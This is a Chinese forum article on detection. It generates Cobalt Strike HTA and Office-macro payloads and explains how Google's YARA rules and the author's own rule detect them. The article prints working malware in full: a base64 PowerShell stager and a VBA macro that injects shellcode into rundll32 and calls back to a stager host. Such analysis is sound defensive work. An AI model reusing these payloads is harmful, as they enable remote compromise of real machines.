用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析
======================================

前言：
---

该系列文章是对 [红队知识仓库 ](https://github.com/Threekiii/Awesome-Redteam)这个高赞项目中所提到的红队工具进行 "打标"的知识分享。前面已经整理了 [用Yara 对红队工具 "打标"](https://forum.butian.net/share/1913) 、 [用 Yara 对红队工具 "打标"（二） ](https://forum.butian.net/share/1954)、[用 Yara 对红队工具 "打标"（三）——免杀类规则提取](https://forum.butian.net/share/2008)，[用 Yara 对红队工具 "打标"（三）——免杀类规则提取（二）](https://forum.butian.net/share/2016)。

这里借着不久前 [Google 云情报威胁团队开源的 YARA 规则集](https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse)，顺着它们的思路，来对 Cobalt Strike 的组件及其生成马进行一次粗浅的分析，如有错误还请指正！

环境准备：
-----

工具：Cobalt Strike 4.7

Google 开源的 YARA 规则集：[GCTI/YARA/CobaltStrike](https://github.com/chronicle/GCTI/tree/main/YARA/CobaltStrike)

Listener 设置：
------------

在用 Cobalt Strike 生成马之前，我们需要设置 Listener，看看官方手册对其的解释：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7e1ef8b6919baf5a78179aaf6fd14d2f884b5d1c.png)

由于我们使用的是最基本的 client-server 设施，所以也不用考虑重定向器什么的。从 listener 的介绍中我们知道它是一个 payload 和 server 中间的桥梁，配置通信信息用的，由于我们研究的是 payload 部分，所以监听器这里我们选择 HTTP 即可。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7be6234cc5150bbd12abb3a3e21f037212e5d835.png)

因为以前我没用过 CS，所以一开始对一些配置和名词有些懵，结合官方解释和[cobalt strike中的一些小知识点的理解](https://blog.csdn.net/qq_41874930/article/details/107797189)中的内容可以知道上面 HTTP Hosts 列表是给核心 payload(shellcode) 连接用的，HTTP Host(Stager) 是分段攻击中的加载器连接用的，用于下载 shellcode。

当有多个 teamserver 共同协作时它们就可以不一样；当只有一个 teamserver 又是分段攻击时，它们就是一样的；当不是分段攻击时(stageless)，只需关注 HTTP Hosts 即可。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-c26a811b9842b3a31747d14df2d853cecee3eb36.png)

这里我生成 3 个是用于对比实验的，现在重点不在这里，有个能用就行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-56bacbf8f90005a01e081f59a12842babd66cc44.png)

HTML Application
----------------

HTML Application 是用 HTML 和 Internet Explorer 支持的脚本语言编写的 Windows 程序。此包生成一个 HTML 应用程序，和常规的 C 语言写的脚本没多大区别，要注意的是都是 stager 加载器类型的，所以要设置好 HTTP Host(Stager)。

该类木马分为了三种，分别是包含 PE 文件的 hta、包含 VBS 的 hta、包含 powershell 的 Hta。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-47d23d3abd71869dd51d58c97d35c1299672499d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-6144bb6dc505907411c0bb3e5801a4cdebaf2b9a.png)

#### **包含 PE 的 Html Application：**

其工作原理是内嵌一个 PE 文件并解码运行：将一个 PE 文件的十六进制数据流硬编码到文件中，然后设置临时目录和随机落地文件名将 PE 流解码释放出来并运行，随后删除落地文件清除痕迹。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-05441e6dc3b18024389b91f158808861ceb2ae46.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e837e7de9422053f0feace50e7dfa76809435646.png)

我们直接通过 CyberChef 工具把 PE 流解码并生成出 PE 文件来。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-fc45733af29236106d0edb657cb80bc2eff8445b.png)

#### **包含 PowerShell 的 Html Application：**

其工作原理是通过解码 base64 加密的长串得到一个压缩包流，然后通过 IO.MemoryStream 等方法加载到内存中进行解压操作。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-f9b1018e3cd18ad9874634346fc52db179b82fb6.png)

&gt; $s=New-Object IO.MemoryStream(,\[Convert\]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,\[IO.Compression.CompressionMode\]::Decompress))).ReadToEnd();

解压出来后得到一个完整的 powershell 代码文件，我自己对 powershell 语法暂时不了解，但是从代码中还是可以看到 base64 + xor 35 的解密操作、动态加载函数地址、内存分配并复制等常规免杀的操作。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-79fd3dfc49e0a2e5f23bc92aa2a847628a04ad1e.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-c1e4af08196d5d93b74ec0bcf2121ed435e11ae0.png)

#### **包含 VBA 的 Html Application：**

其工作原理是先创建一个 Excel 的应用对象，然后指定注册表的键用于保存旧值和设置新值。

HKEY\_CURRENT\_USER\\Software\\Microsoft\\Office\\" &amp; objExcel.Version &amp; "\\Excel\\Security\\AccessVBOM 更改为 1 的作用是允许插入和运行宏代码

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-f8419b21e5f760d322a4e6f2996f1bc72158ed7e.png)

随后是将带轻微混淆的 VBA 代码拼接起来得到要运行的核心代码，混淆的方式是通过 &amp; 符号连接由 chr 函数转换的 ascii，如：&amp;Chr(61)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e37f1219bde703f73908205ca61b7fdca7b556fe.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7b2eaa71c9a85d5c7aac2483a31b16b640f1fc82.png)

。。。然后不会调试这类程序把混淆的抽出来，那就这样吧。。。。

### **匹配 Html Application 和 YARA 规则集：**

由于我们的目的是顺着 Google 规则集的提取点来分析，所以我们先写个小脚本用于匹配谷歌大量的规则集与自己用 Cobalt Strike 生成的 Html Application 木马：

```python
import os
import yara

def match_yara_rule(singlefile,singletarget):
    rules = yara.compile(singlefile)
    matches = rules.match(singletarget)
    if len(matches) &gt; 0 :
        for match in matches:
            print(singlefile,singletarget)
            for strings in match.strings:
                print(strings)
            print('\n')

def yara_scan(rule_path,target_path):
    for single_file in os.listdir(rule_path):       #yara参数中不能有中文！！！
        for single_target in os.listdir(target_path):
            match_yara_rule(rule_path+single_file,target_path+single_target)

rule_file_path = 'D:\YARA\CobaltStrike\\'
target_file_path = 'D:\Cobaltstrike_payload\\'
yara_scan(rule_file_path,target_file_path)
```

Html Application 生成的木马和能抽出来的类型：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-f07797adba61bff443a309b64eeaf25b23b34ed1.png)

**匹配结果与分析：**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-5cc585eabe37e6030519130a292a6ea008ac239d.png)

从规则中可以看到，在对 Html Application 的 VBA 类型代码中，Google 研究人员挑选了外层准备操作部分作为检测面，从 Excel.Application 到 HKEY\_CURRENT\_USER\\Software\\Microsoft\\Office\\" &amp; objExcel.Version &amp; "\\Excel\\Security\\AccessVBOM 等都是必须的前期操作。由于前期准备必不可少，相比于后面的混淆的代码而言，挑选不具混淆又必不可少的部分更为明智。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-70df8f752b9c369ded34f1d15288817166a70140.png)

而在Html Application 的 Powershell 类型代码中，三个阶段分别是 hta、zip、ps1。 hta 就一个解密操作，代码量少且不具代表性。zip 的话其实也是纯纯的内存解压操作。那 ps1 的就都是核心操作了，从这里入手确实更具客观性。

Google 研究人员挑选了前面动态加载反射型的关键代码和带有核心 beacon 连接的通信部分的 base64 解密部分，最后挑选了前面动态获取成功与否的条件判断部分组成了x64\_Ps1\_v3\_0\_to\_v4\_x\_excluding\_3\_12\_3\_13 的规则面，一如既往地没有与混淆加密的部分做硬碰硬。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e02a2b3033f3ca15230008be9f02b54abedf21aa.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-c21b7ebc850c402f6ef6a632a6ddee416d247f64.png)

最后一个 Html Application 的 exe 类型没有检测到，那就自己来吧。顺着 Google 的思路我们不对没代码的 PE 流部分和混淆的部分进行硬碰硬，我们挑选不可分割又不具混淆的准备阶段作为检测面。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-73f64d8fc5abc557f1025c780fa7254ecdc376ad.png)

对于文件名部分由于其是可变的，所以我们用正则匹配替换即可，写成 yara 规则如下：

```c
rule Cobalt_Strike_Html_exe {
    meta:
        author = "muyi_lin"
        description = ""
        date = "2022-12-23"
        reference = "https://github.com/Threekiii/Awesome-Redteam"
        hash = ""
    strings:
        $s1 = "var_tempdir &amp; \"\\\" &amp; var_obj.GetTempName()"
        $s2 = "Wscript.Shell"
        $re1 = /var_basedir &amp; "\\" &amp; "[A-z]{1,20}\.exe"/
        $re2 = /For i = 1 to Len\([A-z]{1,20}\) Step 2/
        $re3 = /var_stream\.Write Chr\(CLng\("&amp;H" &amp; Mid\([A-z]{1,20},i,2\)\)\)/
    condition:
        all of them
}

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-3b40819304168882d9323c2771c0d9571890030b.png)

MS Office Macro：
----------------

根据官网介绍 Microsoft Office 宏工具用于生成要嵌入到 Microsoft Word 或 Microsoft Excel 文档中的宏。

导航到 Payloads-&gt;MS Office Macro 当中按照如下指示一步步操作：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e157e7af2263da338437f43523e10744a2d70196.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-64ed73172167d2e82f68e0484f35a0cc0cbca018.png)

然后便得到如下嵌入的 VBS 宏代码：

```vbscript
Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _
13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _
-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _
-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,81,0,0,0,83,80,104,87,-119,-97, _
-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _
104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _
-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _
-1,-1,47,117,71,51,109,0,-21,63,-37,71,-76,-54,-57,65,-126,74,15,-29,-73,-32,109,18,53,100,-117,90,-28,44,89,17,-108,-105,55,1,-5,74,-66,73, _
-101,-56,39,-75,112,64,-46,30,121,-59,-98,-46,-43,36,-33,100,61,25,49,120,2,47,-109,106,-62,114,-119,116,-7,-77,23,89,122,41,70,95,81,-116,89,-121, _
81,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,48,59,32,84,114,105,100,101,110,116,47,53,46,48,41,13,10,0, _
68,100,-49,-91,-32,-116,60,-23,40,-125,-87,-69,-50,100,-128,-99,-101,-113,89,125,13,-49,-55,83,42,110,-31,-95,-85,-99,-66,-117,31,67,16,1,103,24,-113,44, _
-56,-31,108,-34,66,-62,-120,-46,-46,-81,-107,-35,58,120,-99,73,93,4,11,-9,111,-77,63,-33,96,-48,109,70,-124,35,-114,8,42,-84,22,4,11,-53,105,59, _
-118,-65,69,-116,-10,3,19,28,-75,122,42,78,-4,-41,72,71,124,-88,117,46,26,-82,61,73,-87,-13,-106,-106,62,54,23,-4,71,44,58,-28,-77,82,70,-27, _
121,110,-62,100,97,11,-83,13,78,47,-65,11,-13,-86,-34,-23,53,-12,-89,9,-71,-20,-65,-50,-95,67,107,30,-78,-58,-19,71,-111,44,77,-17,-2,-91,21,21, _
-45,-67,-91,-15,21,-117,-88,107,-70,-85,50,-111,-41,-88,63,35,6,-126,-55,31,21,-30,-114,-2,-55,-122,68,117,75,41,111,-98,123,-35,-52,3,18,-54,5,127, _
50,66,-109,94,87,-75,40,-32,37,15,-3,-108,26,-3,-39,120,-70,-83,-88,51,-29,-30,-83,-42,-58,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _
104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _
-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,51,50,46,49,51,49,0,23,80,101,-22)
    If Len(Environ("ProgramW6432")) &gt; 0 Then
        sProc = Environ("windir") &amp; "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") &amp; "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

```

从前面声明中可以看到其把关键函数的原型赋值给自定义别名，PROCESS\_INFORMATION 和 STARTUPINFO 都是在 CreateProcessA 中要用上的进程标识信息类结构体。VBA7 的语法稍稍有点不同，所以分开代码进行不同操作。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-34ff3f14c72b250011cdca5d3e50b146510b9658.png)

中间的一大段数组 myArray 应该是核心代码，通信用的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-5700f09adaa727e822cc53c1057dd14b867e259a.png)

第一个条件句 Environ("ProgramW6432") 是检查是否是 64 位系统，ProgramW6432 只出现在 64 位系统中，为了兼容 32 位系统，其有了 SysWOW64 这个转化层。

在获取 rundll32.exe 后以其为掩盖，用 RunStuff (CreateProcessA) 创建一个进程并用 AllocStuff(VirtualAllocEx) 为其分配一个 myArray 数组大小的空间然后循环一字节一字节地写入进去，LBound 和 UBound 分别是数组的下标最大值和最小值。最后使用 CreateStuff(CreateRemoteThread) 以主线程的方式运行 myArray 指向的代码。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-2e7f2c149b0980bfcf61155c484e874cee6fe348.png)

最让我头疼的是我不知道 myArray 中的数组代表什么，是代码吗？怎么还有负数的，我该怎么转，是 http 操作吗？实在想不出来。。。。。  
（PS：这在后面 "用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析（二）" 中得到了解释）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-a9c5faf574a524548ea07bf269f97f3bb7de08e7.png)

用 procexp64 创建进程转储后也已经连接 server 下载 payload 了

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-da7232577d34cafc493594bcfc023bc40b6ba066.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e278ac72b982e9b12ae52980ad6e2ff756c5912b.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-928886c391094b8c767335fafaff9c931c34fd35.png)

### 匹配 Macro Office 和 YARA 规则集：

运行脚本，可以看到如下匹配结果：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-cc424a4dfe15e92013675741ea1a0306757ec73f.png)

myArray 是核心点，但直观性不强所以我们不该硬刚，前面分析过了这代码都是常规的另开线程的免杀技巧，嗯嗯嗯其实不算很特别，哪怕是用 VBA 写 的也特别不到哪去。但是 Google 的安全研究人员在基本的免杀之上挑选了一个可能是不变的自定义变量 Dim rwxpage As Long。这个 rwxpage 就灵性了，是自定义变量，如果这个变量不变那特征性确实挺强的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-342ed1ff8ab8228308927afd9c004a1fcf14416b.png)

然后来看规则中一个重要的点，@ 是获取字符串偏移从 1 开始，这里限定了变量 Dim 在函数声明 Function 之后， AllocStuff 函数调用在 Dim 变量之后。这可以说是符合逻辑的，先声明再设置变量再实际调用函数。Google 通过设置这样一个有字符串有位置关系的规则来作为检测标准，考虑了两个维度。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-2c5412c480910d31aa5bf52fe2fe43135cd6f011.png)

YARA 进阶——位置就是一切：
----------------

看到前面 Google 的 @ 在规则中的设置让我联想到从 [Nextron](https://www.nextron-systems.com/) 公司博客站上 [How to Write Simple but Sound Yara Rules – Part 2](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/)) 也被提到过的 "Location is Everything"

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-54e122de3070ee0b7cc2e67ac977934dec3d790f.png)

过去在[用 Yara 对红队工具 "打标"](https://forum.butian.net/share/1913) 和 [用 Yara 对红队工具 "打标"（二）](https://forum.butian.net/share/1954) 中我从该 [Nextron](https://www.nextron-systems.com/) 公司博客站上根据 Part 1 和 Part 2 分别解析了 “如何编写合理有效的 Yara 规则” 和 “YARA 进阶——编写高性能的规则” 。现在我们继续根据 [How to Write Simple but Sound Yara Rules - Part 2 ](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/)分析其讲解的 "Location is Everything" ，不得不说它里面确实都是宝贝。

Yara 的字符串位置定位功能是最被低估的特性之一，使用它可以定义字符串出现的范围以进行匹配。哪怕是被编码或隐藏的 metasploit meterpreter payload 也可以非常可靠地检测。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-738f3c0c51903eb8c67894ccf1aa8aa7854cf857.png)

因为恶意软件总会和正常的有区别，如果一个 payload 被隐藏在有效可执行文件ab.exe 的末尾，并且只展现出典型的函数导出字符串或模拟已知可执行文件，那么从字符串层面上确实无法做对应的规则，但是从这些看似 "正常的" 字符串的位置，我们应该询问以下问题：  
1：这些字符串位于文件中的这个位置是否正常？  
2：这些字符串在该文件中出现多次是否正常？  
3：两个字符串之间的距离是特定的吗？

### **举个例子：**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-93aff380d3b0106c2947898838727eaa3172011c.png)

这段简短的代码可提取的字符串很少，因为要 $code 代码是 bas64 加密的 shellcode，自己的变量名也是自定义的，所以它极易改变，我们不能用它规则。

那么除了它之外就剩下 "@eval(gzinflate(base64\_decode(" 该函数其实很常见，从字符串层面来讲为，了避免误报其实这单个字符串不应该被提取作为规则。但是换一个角度：从字符串和位置层面来讲，它不太可能出现在文件的最后 50 个字节中，因此可以编写了以下规则：

```c
rule Webshell {
    meta:
        hash = "d5696b32d32177cf70eaaa5a28d1c5823526d87e20d3c62b747517c6d41656f7"

    strings:
        $m1 = "@eval(gzinflate(base64_decode("

    condition:
        uint16be(0) == 0x5A4D and filesize &lt; 15KB and $m1 in (filesize-50..filesize)
}
```

### 回到 Google 规则上来：

下面这个在 condition 中设置的两两常规字符串之间的位置顺序，不就是运用了常规上面的原理吗。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-ffd3aa449679df3d06d2eb333dd432beff6f09bf.png)

最后：
---

Cobalt Strike 我自己其实不熟，只能从表层的 Payload 搭配 Listener 开始分析，剩下的 Stager Payload Generator、Stageless Payload Generator、Windows Stager P ayload、Windows Stageless Payload、Windows Stageless Gennerate All Payloads 后面会继续分析。

深层次的魔改 Cobalt Strike 这些暂时不涉及，上面的内容中如有错误还请指正！

参考链接：
-----

[Welcome to Cobalt Strike (helpsystems.com)](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)

<https://gchq.github.io/CyberChef/>

[奇安信攻防社区-用 Yara 对红队工具 "打标" (butian.net)](https://forum.butian.net/share/1913)

[奇安信攻防社区-用 Yara 对红队工具 "打标"（二） (butian.net)](https://forum.butian.net/share/1954)

[How to Write Simple but Sound Yara Rules - Part 2 - Nextron Systems (nextron-systems.com)](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/)

[YARA Performance Guidelines (github.com)](https://gist.github.com/Neo23x0/e3d4e316d7441d9143c7)